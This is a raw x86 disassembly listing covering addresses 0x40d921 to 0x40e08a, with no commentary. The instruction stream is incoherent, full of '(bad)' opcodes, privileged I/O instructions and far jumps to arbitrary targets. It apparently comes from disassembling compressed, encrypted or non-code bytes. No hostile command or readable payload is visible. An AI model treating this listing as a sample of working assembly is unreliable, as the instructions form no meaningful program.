  40d921:	add    bh,BYTE PTR [edi]
  40d923:	sar    ch,1
  40d925:	xor    DWORD PTR [edi+edi*2],ecx
  40d928:	mov    cl,ch
  40d92a:	popa   
  40d92b:	xor    al,0xc6
  40d92d:	loopne 0x40d8bc
  40d92f:	xor    al,0x9
  40d931:	iret   
  40d932:	xchg   edx,eax
  40d933:	pop    edx
  40d934:	jl     0x40d921
  40d936:	call   0x492dada6
  40d93b:	push   edi
  40d93c:	xor    DWORD PTR [ebx-0x4a840897],0xe5e2a8c1
  40d946:	jns    0x40d9b5
  40d948:	cmp    ebx,DWORD PTR [edx+0x11]
  40d94b:	sti    
  40d94c:	xchg   ebp,eax
  40d94d:	jl     0x40d946
  40d94f:	loope  0x40d91f
  40d951:	je     0x40d90a
  40d953:	in     eax,0x10
  40d955:	xor    dh,cl
  40d957:	cmp    esp,DWORD PTR [eax-0x3d0d8c9a]
  40d95d:	mov    cs,edi
  40d95f:	xor    BYTE PTR [esi],0xf2
  40d962:	or     esp,ebp
  40d964:	mov    cl,0xb7
  40d966:	and    cl,BYTE PTR [edx]
  40d968:	pop    es
  40d969:	aaa    
  40d96a:	iret   
  40d96b:	gs icebp 
  40d96d:	cs mov esp,ecx
  40d970:	sbb    ecx,DWORD PTR [edi+0x48]
  40d973:	outs   dx,BYTE PTR ds:[esi]
  40d974:	repz hlt 
  40d976:	popf   
  40d977:	fucomp st(3)
  40d979:	cmp    BYTE PTR [eax],0x44
  40d97c:	(bad)  
  40d97e:	jno    0x40d943
  40d980:	lahf   
  40d981:	or     DWORD PTR [ebx-0x40],esi
  40d984:	shl    BYTE PTR [eax+0x538baf75],cl
  40d98a:	je     0x40d9dd
  40d98c:	out    dx,eax
  40d98d:	ja     0x40d911
  40d98f:	ret    0xa506
  40d992:	mov    cl,0x4f
  40d994:	ror    BYTE PTR [ebp+0x3d],0x1
  40d998:	repnz cwde 
  40d99a:	sti    
  40d99b:	stc    
  40d99c:	or     BYTE PTR [ebx+0x2c634a36],ah
  40d9a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d9a3:	mov    edi,0x93e0d509
  40d9a8:	rcr    DWORD PTR [ebx-0x60],1
  40d9ab:	add    BYTE PTR [eax-0x54619030],bl
  40d9b1:	ins    BYTE PTR es:[edi],dx
  40d9b2:	sbb    ebx,DWORD PTR [edi-0xb859e18]
  40d9b8:	push   ss
  40d9b9:	scas   al,BYTE PTR es:[edi]
  40d9ba:	(bad)  
  40d9bb:	xchg   esi,eax
  40d9bc:	jecxz  0x40d984
  40d9be:	cmp    cl,cl
  40d9c0:	add    eax,0xc2caa8ec
  40d9c5:	iret   
  40d9c6:	sbb    ebx,DWORD PTR [esi]
  40d9c8:	xlat   BYTE PTR ds:[ebx]
  40d9c9:	sbb    BYTE PTR [ecx+0x1bd15703],ah
  40d9cf:	cdq    
  40d9d0:	add    BYTE PTR [eax+0x242b59f6],0x2f
  40d9d7:	and    DWORD PTR [esi],0x11
  40d9da:	mov    cl,0x18
  40d9dc:	jmp    0x71988bee
  40d9e1:	shr    DWORD PTR [esi],1
  40d9e3:	push   esi
  40d9e4:	shr    dl,0xb2
  40d9e7:	add    BYTE PTR [eax+0x36],ah
  40d9ea:	and    al,0xcd
  40d9ec:	or     al,0xb3
  40d9ee:	mov    DWORD PTR [edx+eiz*1],esp
  40d9f1:	sub    bh,dl
  40d9f3:	adc    eax,0x5c9be4ae
  40d9f8:	inc    edi
  40d9f9:	sub    BYTE PTR [eax+esi*4-0x72],al
  40d9fd:	xor    DWORD PTR ds:0x4cd39006,edi
  40da03:	push   esp
  40da04:	xchg   ebp,eax
  40da05:	loopne 0x40da06
  40da07:	jp     0x40d9a7
  40da09:	repnz fistp DWORD PTR [ebp+0xec2bbdf]
  40da10:	ss add ah,al
  40da13:	mov    ch,0x26
  40da15:	mov    eax,DWORD PTR [edi+0x4f]
  40da18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da19:	lds    ebp,FWORD PTR [edi-0x8]
  40da1c:	dec    eax
  40da1d:	sbb    esp,DWORD PTR [ecx-0x3c19a61a]
  40da23:	adc    al,BYTE PTR [eax+0x450abb98]
  40da29:	sub    cl,BYTE PTR [ecx]
  40da2b:	ja     0x40da73
  40da2d:	dec    eax
  40da2e:	or     al,0x1
  40da30:	in     eax,0x3
  40da32:	addr16 pop ds
  40da34:	in     al,0x1
  40da36:	iret   
  40da37:	xor    DWORD PTR [eax],ebp
  40da39:	mov    ecx,0x322022d0
  40da3e:	adc    DWORD PTR [ecx-0x6e1cfa89],ebx
  40da44:	mov    bl,0xaf
  40da46:	(bad)  
  40da47:	retf   0x1cbd
  40da4a:	adc    esp,0x16
  40da4d:	stos   DWORD PTR es:[edi],eax
  40da4e:	addr16 pop es
  40da50:	mov    ch,0x6a
  40da52:	cmc    
  40da53:	mov    ah,0xb1
  40da55:	ret    0x4d6d
  40da58:	sub    eax,0xc2e6ef90
  40da5d:	sbb    BYTE PTR [ebp+0x6c],ah
  40da60:	fmul   DWORD PTR [edi-0x9]
  40da63:	arpl   WORD PTR [eax+0x20],si
  40da66:	mov    eax,0x1bb1c7bf
  40da6b:	inc    edx
  40da6c:	jl     0x40daeb
  40da6e:	scas   eax,DWORD PTR es:[edi]
  40da6f:	mov    ds:0x570adea3,eax
  40da74:	ss jne 0x40da9d
  40da77:	aaa    
  40da78:	rol    ecx,cl
  40da7a:	mov    ?,edi
  40da7c:	jno    0x40da9b
  40da7e:	pusha  
  40da7f:	in     eax,0xdc
  40da81:	mov    dh,0xa7
  40da83:	sub    eax,0x98cc3634
  40da88:	and    ah,BYTE PTR [esi-0x34cd899f]
  40da8e:	mov    ebx,0xe7589e09
  40da93:	pop    eax
  40da94:	lock adc eax,0x199016c
  40da9a:	jb     0x40da62
  40da9c:	jno    0x40db11
  40da9e:	jne    0x40db13
  40daa0:	add    eax,0xcc7c395d
  40daa5:	fwait
  40daa6:	in     al,dx
  40daa7:	ins    DWORD PTR es:[edi],dx
  40daa8:	mov    esi,0xf66dd51d
  40daad:	loope  0x40da7d
  40daaf:	cmp    al,0xb7
  40dab1:	(bad)  
  40dab2:	sub    BYTE PTR [eax],bl
  40dab4:	fild   WORD PTR [edi]
  40dab6:	dec    ebx
  40dab7:	xchg   DWORD PTR [eax-0xc06d22e],esi
  40dabd:	xor    al,0x18
  40dabf:	jae    0x40da87
  40dac1:	addr16 push ebp
  40dac3:	adc    eax,0x2f4c2bf
  40dac8:	(bad)  
  40dac9:	push   ss
  40daca:	dec    ebx
  40dacb:	add    dl,BYTE PTR [esp+ebp*1]
  40dace:	or     BYTE PTR [esp+esi*1+0x7c77e07d],dh
  40dad5:	xor    DWORD PTR [ebx+edx*8],0xd4ebf942
  40dadc:	mov    eax,ds:0x8dd08275
  40dae1:	sub    BYTE PTR [eax+0x3a8b4b74],0x7f
  40dae8:	xchg   edi,eax
  40dae9:	pop    edx
  40daea:	in     eax,0xc2
  40daec:	dec    edi
  40daed:	and    ch,BYTE PTR [edx]
  40daef:	shl    ah,1
  40daf1:	outs   dx,DWORD PTR ds:[esi]
  40daf2:	ins    DWORD PTR es:[edi],dx
  40daf3:	test   BYTE PTR ds:0x66d22e8c,0xa7
  40dafa:	sub    edx,ebp
  40dafc:	cmp    DWORD PTR [ecx+0x4155675e],ebp
  40db02:	sub    bl,ah
  40db04:	retf   0x6727
  40db07:	add    BYTE PTR [eax+0x60],cl
  40db0a:	add    edi,DWORD PTR ds:0xbd5a9265
  40db10:	pop    esp
  40db11:	inc    esp
  40db12:	inc    ebx
  40db14:	lock mov cl,0x88
  40db17:	mov    ebx,0xba47c6c9
  40db1c:	xor    ah,BYTE PTR [esi-0x3f]
  40db1f:	out    dx,al
  40db20:	xlat   BYTE PTR ds:[ebx]
  40db21:	inc    esp
  40db22:	xor    ebx,ecx
  40db24:	mov    ah,BYTE PTR [eax+0x50]
  40db27:	mov    DWORD PTR [ebx+0x70],0x6c79f98
  40db2e:	stos   BYTE PTR es:[edi],al
  40db2f:	test   eax,0xc2bd6481
  40db34:	xor    bh,BYTE PTR [edi]
  40db36:	or     eax,0x2f73587a
  40db3b:	add    edx,DWORD PTR [eax+0x74cc7912]
  40db41:	xchg   DWORD PTR [edi-0xe],esi
  40db44:	cmp    ecx,esp
  40db46:	fidivr WORD PTR [esi+0x3b]
  40db49:	jle    0x40db46
  40db4b:	arpl   WORD PTR [ebp+0x6d42f2b7],ax
  40db51:	iret   
  40db52:	retf   0x639e
  40db55:	xchg   edx,eax
  40db56:	sbb    al,0xa6
  40db58:	mov    ch,bl
  40db5a:	push   0xffffffc4
  40db5c:	xchg   ebx,eax
  40db5d:	fidiv  DWORD PTR [ecx]
  40db5f:	jge    0x40db76
  40db61:	mov    ecx,0xa747e138
  40db66:	(bad)  
  40db67:	stos   DWORD PTR es:[edi],eax
  40db68:	call   0x4b9f:0x8a9802d8
  40db6f:	imul   edi,DWORD PTR [ebp-0x38cfc654],0xe3fee257
  40db79:	xor    BYTE PTR [ecx-0x6002bf46],dl
  40db7f:	repnz dec edx
  40db81:	sbb    eax,0x8146aa52
  40db86:	cmp    BYTE PTR ds:0x7be63646,bl
  40db8c:	cmp    dh,bl
  40db8e:	mov    ds:0xf614c61f,al
  40db93:	xlat   BYTE PTR ds:[ebx]
  40db94:	inc    ebp
  40db95:	mov    al,0xf
  40db97:	(bad)  
  40db98:	pop    eax
  40db99:	pop    ecx
  40db9a:	arpl   WORD PTR [ebx],ax
  40db9c:	cli    
  40db9d:	adc    al,0x65
  40db9f:	and    ah,bh
  40dba1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dba2:	das    
  40dba3:	or     edi,DWORD PTR [ebx]
  40dba5:	scas   eax,DWORD PTR es:[edi]
  40dba6:	push   esp
  40dba7:	fdiv   DWORD PTR ds:[ecx+0x7c8c4164]
  40dbae:	scas   al,BYTE PTR es:[edi]
  40dbaf:	jecxz  0x40dbed
  40dbb1:	push   edx
  40dbb2:	fcom   QWORD PTR [esi]
  40dbb4:	pop    esi
  40dbb5:	add    cl,al
  40dbb7:	(bad)
  40dbbc:	inc    esi
  40dbbd:	xor    al,0x41
  40dbbf:	sub    eax,0x7fccf130
  40dbc4:	add    eax,0x2fea41cb
  40dbc9:	push   es
  40dbca:	sbb    BYTE PTR [esp+eiz*8+0x53],bl
  40dbce:	push   0x4b30cfcf
  40dbd3:	mov    cl,0xc4
  40dbd5:	enter  0x99e3,0x2b
  40dbd9:	add    al,BYTE PTR [ebx-0x34]
  40dbdc:	mov    ds:0xf90f793f,eax
  40dbe1:	push   ecx
  40dbe2:	(bad)  
  40dbe3:	adc    dh,BYTE PTR [edi-0x1b]
  40dbe6:	js     0x40db6c
  40dbe8:	xor    bl,BYTE PTR [ecx-0x56]
  40dbeb:	xchg   esi,eax
  40dbec:	stc    
  40dbed:	rcr    DWORD PTR [esi],0x1b
  40dbf0:	xchg   ebx,eax
  40dbf1:	scas   al,BYTE PTR es:[edi]
  40dbf2:	push   ebx
  40dbf3:	shl    DWORD PTR [ecx],1
  40dbf5:	ret    0x2ba8
  40dbf8:	pop    ecx
  40dbf9:	jmp    DWORD PTR [eax]
  40dbfb:	pushf  
  40dbfc:	and    DWORD PTR [edi+0x429a5f01],esi
  40dc02:	popf   
  40dc03:	jmp    0xf729:0x6806de77
  40dc0a:	repnz push ds
  40dc0c:	or     ebx,DWORD PTR [eax-0x50]
  40dc0f:	icebp  
  40dc10:	sub    DWORD PTR [ebp-0x74],ebp
  40dc13:	mov    BYTE PTR [edi+0x7f0f7889],0x2a
  40dc1a:	inc    esp
  40dc1b:	cdq    
  40dc1c:	jmp    0x7bd0:0xef1c7330
  40dc23:	sbb    DWORD PTR [edx+0x52caf5e6],edx
  40dc29:	push   ebp
  40dc2a:	and    bl,bl
  40dc2c:	mov    eax,0xdb749e4f
  40dc31:	xchg   ecx,eax
  40dc32:	(bad)  
  40dc33:	sub    eax,0x16c3107f
  40dc38:	sbb    DWORD PTR [ebx],ecx
  40dc3a:	push   esp
  40dc3b:	sub    ch,BYTE PTR [ebx+0x23540232]
  40dc41:	out    0x3e,al
  40dc43:	sbb    DWORD PTR [edi+0x5b1b8a7d],0xc85cc575
  40dc4d:	ss adc eax,0xcc062b79
  40dc53:	mov    eax,0xc50d7c2c
  40dc58:	into   
  40dc59:	dec    ebp
  40dc5a:	stos   DWORD PTR es:[edi],eax
  40dc5b:	jge    0x40dc8a
  40dc5d:	jnp    0x40dc30
  40dc5f:	int3   
  40dc60:	lahf   
  40dc61:	ins    BYTE PTR es:[edi],dx
  40dc62:	and    dh,BYTE PTR [ecx]
  40dc64:	fidivr WORD PTR [edx-0x5a]
  40dc67:	and    bl,ch
  40dc69:	jb     0x40dbf9
  40dc6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc6c:	mov    ah,0x23
  40dc6e:	cmp    al,0x69
  40dc70:	scas   eax,DWORD PTR es:[edi]
  40dc71:	mov    ch,0x8c
  40dc73:	mov    ah,0xf7
  40dc75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc76:	in     eax,0x51
  40dc78:	jo     0x40dc9f
  40dc7a:	mov    WORD PTR [ecx+0x56],ds
  40dc7d:	aas    
  40dc7e:	mov    ah,0x6d
  40dc80:	outs   dx,BYTE PTR ds:[esi]
  40dc81:	inc    ebp
  40dc82:	xchg   esp,eax
  40dc83:	je     0x40dc4a
  40dc85:	adc    al,0xfa
  40dc87:	and    eax,0xe1b94ed3
  40dc8c:	shr    bh,0x48
  40dc8f:	cld    
  40dc90:	sahf   
  40dc91:	pop    ebx
  40dc92:	xor    DWORD PTR [ebp-0xe],ebp
  40dc95:	stos   BYTE PTR es:[edi],al
  40dc96:	mov    bl,0xb3
  40dc98:	out    0x31,al
  40dc9a:	cli    
  40dc9b:	push   ebp
  40dc9c:	fadd   st,st(3)
  40dc9e:	gs or  al,0x5a
  40dca1:	cld    
  40dca2:	lds    esi,FWORD PTR [ebx-0x5d]
  40dca5:	mov    ah,0x92
  40dca7:	cmp    DWORD PTR [eax+0x670691f0],0x69e3315d
  40dcb1:	fsub   QWORD PTR [edi+0x5e2273ba]
  40dcb7:	aas    
  40dcb8:	and    BYTE PTR [esi],0x3c
  40dcbb:	sub    BYTE PTR [esi],0x70
  40dcbe:	stos   BYTE PTR es:[edi],al
  40dcbf:	iret   
  40dcc0:	add    al,0x48
  40dcc2:	in     al,0x2
  40dcc4:	rol    BYTE PTR [edx],cl
  40dcc6:	dec    esp
  40dcc7:	scas   eax,DWORD PTR es:[edi]
  40dcc8:	jl     0x40dc68
  40dcca:	popf   
  40dccb:	outs   dx,DWORD PTR ds:[esi]
  40dccc:	in     al,0x41
  40dcce:	imul   ecx,DWORD PTR [ebx],0x83a7737
  40dcd4:	mov    ecx,0x1aca0ee1
  40dcd9:	retf   
  40dcda:	xchg   ebp,eax
  40dcdb:	mov    ds:0x36e0370f,al
  40dce0:	ja     0x40dd4c
  40dce2:	and    edi,DWORD PTR [eax+0x6213094b]
  40dce8:	dec    ebp
  40dce9:	mov    edi,ds
  40dceb:	xor    al,0xc6
  40dced:	pop    ebp
  40dcee:	sahf   
  40dcef:	adc    BYTE PTR [eax+0x1ffe563c],dh
  40dcf5:	inc    eax
  40dcf6:	gs push cs
  40dcf8:	or     eax,0x553877e8
  40dcfd:	mov    ah,0x57
  40dcff:	cmp    al,0x28
  40dd01:	cdq    
  40dd02:	ja     0x40dd10
  40dd04:	fistp  WORD PTR [edi]
  40dd06:	mov    cl,0xf1
  40dd08:	adc    esp,ebp
  40dd0a:	xor    esp,edx
  40dd0c:	call   edi
  40dd0e:	cmp    al,0xe1
  40dd10:	outs   dx,BYTE PTR ds:[esi]
  40dd11:	adc    cl,ch
  40dd13:	pusha  
  40dd14:	popf   
  40dd15:	(bad)  
  40dd17:	shl    cl,0x66
  40dd1a:	jmp    0x171b:0x55a0d1b6
  40dd21:	lds    esi,FWORD PTR [edx+0x2f995a9c]
  40dd27:	xchg   edi,eax
  40dd28:	jno    0x40dd1f
  40dd2a:	push   esp
  40dd2b:	enter  0x8e46,0x8c
  40dd2f:	mov    edx,0x99c47dec
  40dd34:	or     al,0xab
  40dd36:	das    
  40dd37:	cwde   
  40dd38:	aam    0x5f
  40dd3a:	pop    edx
  40dd3b:	call   0xb12701ed
  40dd40:	mov    WORD PTR [ecx],fs
  40dd42:	adc    BYTE PTR [ebp+ebp*1+0xece892c],dl
  40dd49:	scas   eax,DWORD PTR es:[edi]
  40dd4a:	mov    dl,0xc7
  40dd4c:	mov    al,ds:0xc114f950
  40dd51:	xchg   ebp,eax
  40dd52:	pushf  
  40dd53:	dec    esi
  40dd54:	sub    BYTE PTR ds:0xa952da0f,bh
  40dd5a:	sbb    ecx,DWORD PTR [ebp+eax*8+0x7fc60776]
  40dd61:	mov    ecx,DWORD PTR [esp+ebx*8+0x31a45255]
  40dd68:	mov    ds,WORD PTR [ebx-0x3a]
  40dd6b:	fwait
  40dd6c:	add    esp,edx
  40dd6e:	cdq    
  40dd6f:	xchg   DWORD PTR [eax+0x66f02153],ecx
  40dd75:	sahf   
  40dd76:	cmp    eax,0xae309af3
  40dd7b:	inc    ecx
  40dd7c:	and    bl,BYTE PTR [esi-0x66]
  40dd7f:	repnz push edx
  40dd81:	pop    esi
  40dd82:	add    bh,BYTE PTR [edx+0x71]
  40dd85:	jl     0x40dd51
  40dd87:	jp     0x40dd89
  40dd89:	xchg   esp,eax
  40dd8a:	in     al,dx
  40dd8b:	(bad)  
  40dd8c:	(bad)  
  40dd8d:	xor    BYTE PTR [esi],bl
  40dd8f:	daa    
  40dd90:	gs (bad) 
  40dd92:	xchg   ebp,eax
  40dd93:	push   esp
  40dd94:	mov    esi,0x15d60f80
  40dd99:	sbb    esi,ebx
  40dd9b:	daa    
  40dd9c:	sbb    DWORD PTR [ebx-0x7d7af454],edx
  40dda2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dda3:	or     BYTE PTR [ecx],ch
  40dda5:	out    0xa,al
  40dda7:	(bad)  
  40dda8:	pop    ds
  40dda9:	(bad)  
  40ddaa:	sub    esp,ebp
  40ddac:	adc    al,BYTE PTR [ebx-0x50]
  40ddaf:	jle    0x40dd89
  40ddb1:	aam    0x53
  40ddb3:	push   ds
  40ddb4:	adc    DWORD PTR [ebx],edx
  40ddb6:	cmc    
  40ddb7:	xchg   esi,eax
  40ddb8:	enter  0xc8de,0x84
  40ddbc:	retf   0xd5ee
  40ddbf:	inc    ebx
  40ddc0:	int3   
  40ddc1:	(bad)  
  40ddc2:	and    eax,0xd4d59553
  40ddc7:	cwde   
  40ddc8:	fisttp DWORD PTR cs:[ebx-0x58]
  40ddcc:	adc    al,0x4f
  40ddce:	or     bl,BYTE PTR ds:[ecx+ebp*2-0x15]
  40ddd3:	sar    BYTE PTR [edx],0x50
  40ddd6:	cli    
  40ddd7:	imul   edx,DWORD PTR [edi],0x2d47f1af
  40dddd:	sahf   
  40ddde:	outs   dx,DWORD PTR ds:[esi]
  40dddf:	cmp    BYTE PTR [edi+0x11e22830],0xef
  40dde6:	jl     0x40de01
  40dde8:	inc    ebp
  40dde9:	and    al,0x3d
  40ddeb:	push   ds
  40ddec:	into   
  40dded:	sub    al,0xdb
  40ddef:	les    edx,FWORD PTR [ebx]
  40ddf1:	call   0xcc2e:0xf437779
  40ddf8:	inc    edi
  40ddf9:	mov    al,0xff
  40ddfb:	ret    0xcbd9
  40ddfe:	ret    
  40ddff:	mov    edx,0x3cbdf37
  40de04:	dec    edx
  40de05:	xchg   DWORD PTR [eax+0x7db17391],ebx
  40de0b:	paddd  mm7,QWORD PTR [ebp+0x48]
  40de0f:	xchg   esp,eax
  40de10:	mov    edx,0xe75b0547
  40de15:	mov    bh,0x41
  40de17:	xor    BYTE PTR [ebx-0x7c],0xe9
  40de1b:	pop    edx
  40de1c:	int3   
  40de1d:	adc    eax,0xf56ec7d2
  40de22:	test   al,0xdf
  40de24:	jmp    0xdbf594ad
  40de29:	inc    ecx
  40de2a:	xor    ebp,0x71
  40de2d:	sbb    DWORD PTR [edx+0x5c44fbdc],edx
  40de33:	mov    ch,0xd1
  40de35:	add    ebp,esp
  40de37:	adc    bh,al
  40de39:	push   ss
  40de3a:	pop    ss
  40de3b:	push   ecx
  40de3c:	sbb    eax,0xe41cd5b9
  40de41:	popa   
  40de42:	mov    ah,0x24
  40de44:	aaa    
  40de45:	test   al,cl
  40de47:	and    ah,ch
  40de49:	test   BYTE PTR [eax-0x1e],dh
  40de4c:	push   ecx
  40de4d:	test   DWORD PTR [bp+si-0xfb0],edi
  40de52:	adc    dh,dl
  40de54:	sahf   
  40de55:	cwde   
  40de56:	cmp    BYTE PTR [esi],bl
  40de58:	pop    eax
  40de59:	stos   DWORD PTR es:[edi],eax
  40de5a:	inc    eax
  40de5b:	push   edx
  40de5c:	or     edx,0xffffffc6
  40de5f:	fsubr  QWORD PTR [eax-0x666c95e5]
  40de65:	adc    ch,BYTE PTR [edx+edi*8]
  40de68:	neg    bl
  40de6a:	icebp  
  40de6b:	dec    edi
  40de6c:	push   ds
  40de6d:	sub    DWORD PTR [ecx+0xf],ecx
  40de70:	sbb    eax,0x6edc5791
  40de75:	(bad)  
  40de76:	retf   
  40de77:	push   ebx
  40de78:	loopne 0x40dead
  40de7a:	(bad)  
  40de7b:	mov    DWORD PTR [esi+0x39],esi
  40de7e:	sub    ch,cl
  40de80:	rol    DWORD PTR [ebx+0xf],1
  40de83:	cld    
  40de84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de85:	lock adc edi,DWORD PTR [ebx+0x4e]
  40de89:	cmp    BYTE PTR [ecx-0x7],dl
  40de8c:	adc    cl,BYTE PTR [ebp+0x58b01104]
  40de92:	jo     0x40dec6
  40de94:	jmp    FWORD PTR [eax+0x6b41e772]
  40de9a:	ds push 0xffffff81
  40de9d:	jge    0x40deea
  40de9f:	jge    0x40de8d
  40dea1:	adc    eax,0xf98c14b3
  40dea6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dea7:	xchg   edx,eax
  40dea8:	mov    eax,ds:0xa1c23159
  40dead:	lahf   
  40deae:	shl    ah,0xfd
  40deb1:	xchg   DWORD PTR [eax-0x603d07e8],esi
  40deb7:	aam    0x4e
  40deb9:	jb     0x40df10
  40debb:	aas    
  40debc:	sub    edi,edi
  40debe:	daa    
  40debf:	sub    ecx,esi
  40dec1:	mov    edx,0x706580ee
  40dec6:	stc    
  40dec7:	nop
  40dec8:	in     al,0x6c
  40deca:	addr16 daa 
  40decc:	adc    dl,ch
  40dece:	inc    edx
  40decf:	pop    edi
  40ded0:	es nop
  40ded2:	mov    eax,0xfa2e4a03
  40ded7:	aas    
  40ded8:	jmp    0x523b:0x47718f1d
  40dedf:	push   ss
  40dee0:	jmp    0x1427:0x4d20f6b4
  40dee7:	bound  edx,QWORD PTR [esi]
  40dee9:	cs test al,0x88
  40deec:	pop    esi
  40deed:	repz cld 
  40deef:	fdivr  st,st(2)
  40def1:	mov    esi,0x96d2c73a
  40def6:	inc    ecx
  40def7:	sbb    al,BYTE PTR [ebx]
  40def9:	pusha  
  40defa:	lahf   
  40defb:	fld    DWORD PTR [eax+0x7906bc10]
  40df01:	mov    cl,0xb1
  40df03:	dec    ebp
  40df04:	sahf   
  40df05:	inc    ecx
  40df07:	add    DWORD PTR [ebp-0x1e],0xffffff9a
  40df0b:	leave  
  40df0c:	pop    eax
  40df0d:	clc    
  40df0e:	(bad)  
  40df10:	and    al,0x68
  40df12:	pushf  
  40df13:	jmp    0x1fbb:0x5ce1f88d
  40df1a:	hlt    
  40df1b:	add    BYTE PTR ds:0x6e780292,0xb
  40df22:	pop    edi
  40df23:	pop    esp
  40df24:	ffree  st(3)
  40df26:	sahf   
  40df27:	xchg   DWORD PTR [edi],eax
  40df29:	dec    ebp
  40df2a:	jno    0x40deb5
  40df2c:	stos   BYTE PTR es:[edi],al
  40df2d:	sub    eax,0xb66fb256
  40df32:	mov    eax,ds:0x5d82a7b7
  40df37:	pop    ds
  40df38:	ds mov ch,0xd6
  40df3b:	push   edx
  40df3c:	cmp    ecx,edi
  40df3e:	dec    ecx
  40df3f:	xchg   BYTE PTR [edx],ah
  40df41:	outs   dx,DWORD PTR ds:[esi]
  40df42:	mov    esi,DWORD PTR [eax+0x19bc286b]
  40df48:	int3   
  40df49:	xchg   BYTE PTR [ecx],bl
  40df4b:	xor    edi,DWORD PTR [edx]
  40df4d:	fwait
  40df4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df4f:	xchg   edx,eax
  40df50:	daa    
  40df51:	mov    dl,0xa9
  40df53:	jg     0x40defe
  40df55:	and    DWORD PTR [esi+0x65],0xffffffe7
  40df59:	push   cs
  40df5a:	pop    ecx
  40df5b:	fincstp 
  40df5d:	(bad)  
  40df5e:	or     eax,0x79214e7a
  40df63:	add    eax,DWORD PTR [eax-0x7b]
  40df66:	sti    
  40df67:	xchg   DWORD PTR [ebp+0x4f],esi
  40df6a:	jge    0x40df85
  40df6c:	ret    
  40df6d:	push   ebx
  40df6e:	inc    ecx
  40df6f:	push   esi
  40df70:	and    edi,DWORD PTR [edx-0x1ab6964f]
  40df76:	(bad)  
  40df77:	xchg   edi,eax
  40df78:	pop    ecx
  40df79:	push   ebp
  40df7a:	xlat   BYTE PTR ds:[ebx]
  40df7b:	xor    bh,BYTE PTR [eax]
  40df7d:	or     BYTE PTR [edi-0xf],ah
  40df80:	push   0x90d9c753
  40df85:	loope  0x40df5f
  40df87:	jp     0x40dfc0
  40df89:	nop
  40df8a:	jmp    0x3f2c5190
  40df8f:	iret   
  40df90:	jno    0x40e007
  40df92:	jae    0x40e012
  40df94:	inc    ebp
  40df95:	mov    ds:0x69ba2472,eax
  40df9a:	(bad)  
  40df9b:	dec    eax
  40df9c:	std    
  40df9d:	inc    edx
  40df9e:	(bad)  
  40df9f:	mov    ebx,DWORD PTR [ecx]
  40dfa1:	dec    ebp
  40dfa2:	and    al,0xfe
  40dfa4:	out    dx,al
  40dfa5:	sub    DWORD PTR [esi+0x6e],edi
  40dfa8:	dec    edx
  40dfa9:	(bad)  
  40dfaa:	mov    bh,0xad
  40dfac:	rcr    DWORD PTR [edi-0x7],1
  40dfaf:	fadd   DWORD PTR [ebx+eiz*4]
  40dfb2:	mov    eax,0x87094dae
  40dfb7:	add    eax,0x70c9e7f7
  40dfbc:	fnsave [ecx+0x2e]
  40dfbf:	pushf  
  40dfc0:	out    0x77,eax
  40dfc2:	(bad)  
  40dfc3:	xor    dh,BYTE PTR [esi+0x2e54948d]
  40dfc9:	das    
  40dfca:	inc    esp
  40dfcb:	jns    0x40df76
  40dfcd:	jmp    0x44cd:0xbe30889b
  40dfd4:	xor    edi,esp
  40dfd6:	scas   al,BYTE PTR es:[edi]
  40dfd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dfd8:	sar    BYTE PTR [edi],cl
  40dfda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dfdb:	imul   ecx,DWORD PTR [ecx-0x64],0x4d6ccd9a
  40dfe2:	push   es
  40dfe3:	mov    ds:0xc0334c3b,al
  40dfe8:	sbb    al,0xb6
  40dfea:	jecxz  0x40dfec
  40dfec:	push   ebx
  40dfed:	in     al,dx
  40dfee:	push   ecx
  40dfef:	sub    eax,0xa59e4278
  40dff4:	xchg   BYTE PTR [ecx+0x46e1e737],al
  40dffa:	lock cmp al,0xac
  40dffd:	gs stc 
  40dfff:	inc    eax
  40e000:	jne    0x40dff0
  40e002:	push   ds
  40e003:	loope  0x40dff5
  40e005:	in     eax,0x46
  40e007:	(bad)  
  40e008:	fld    QWORD PTR [ebx]
  40e00a:	stc    
  40e00b:	test   BYTE PTR [eax+0x7a],ah
  40e00e:	bound  ecx,QWORD PTR [edx+0x3b992e59]
  40e014:	push   edx
  40e015:	mov    al,ds:0xce356e91
  40e01a:	cmp    ebx,ebp
  40e01c:	sbb    DWORD PTR [esi-0x651268e],ecx
  40e022:	dec    ebp
  40e023:	fucom  st(7)
  40e025:	dec    eax
  40e026:	gs pusha 
  40e028:	or     al,BYTE PTR [edi-0x5987edba]
  40e02e:	xor    DWORD PTR [edi-0x29],0x2
  40e032:	jmp    0x457a:0xfa894875
  40e039:	enter  0xdfbf,0xf2
  40e03d:	lods   al,BYTE PTR ds:[esi]
  40e03e:	rcl    DWORD PTR [edi-0x20f8b2bf],0xda
  40e045:	mov    ds:0x19eca04a,al
  40e04a:	mov    dh,0x70
  40e04c:	leave  
  40e04d:	loop   0x40e0a4
  40e04f:	lock dec ebx
  40e051:	xchg   ebx,eax
  40e052:	fcmovb st,st(7)
  40e054:	fnsave [edx+0x1]
  40e057:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e058:	ret    0xb7b6
  40e05b:	xor    edx,ecx
  40e05d:	scas   eax,DWORD PTR es:[edi]
  40e05e:	jp     0x40e057
  40e060:	leave  
  40e061:	aad    0x98
  40e063:	adc    eax,0xbc2236d0
  40e068:	ret    
  40e069:	mov    ecx,0xf61139f
  40e06e:	sahf   
  40e06f:	cmp    eax,DWORD PTR [ebx]
  40e071:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e072:	cdq    
  40e073:	aam    0xf0
  40e075:	ds push cs
  40e077:	popa   
  40e078:	adc    eax,0xf3b32349
  40e07d:	xchg   ebp,eax
  40e07e:	jecxz  0x40e0ca
  40e080:	(bad)  
  40e081:	jecxz  0x40e01c
  40e083:	xchg   edi,eax
  40e084:	loop   0x40e00c
  40e086:	add    bl,BYTE PTR [eax]
  40e088:	int3   
  40e089:	daa    
  40e08a:	inc    eax
